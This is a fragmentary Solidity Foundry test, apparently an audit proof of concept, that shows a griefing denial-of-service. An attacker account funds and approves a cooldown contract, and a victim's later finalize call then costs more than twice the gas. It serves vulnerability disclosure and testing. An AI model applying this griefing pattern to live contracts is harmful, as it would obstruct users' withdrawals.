...
contract WithdrawGriefingDoS is Test {
    ...
    function test_poc() public {
        ...
        deal(USDE, EVE, 1e18);
        vm.prank(EVE);
        IERC20(USDE).approve(address(erc20Cooldown), 1e18);
        ...
        vm.prank(BOB);
        erc20Cooldown.finalize(IERC20(USDE), BOB);
        ...
        // this time bob needed more 2x the gas to finalize
        assertGt(gasUsed2, 2*gasUsed1);
    }
}
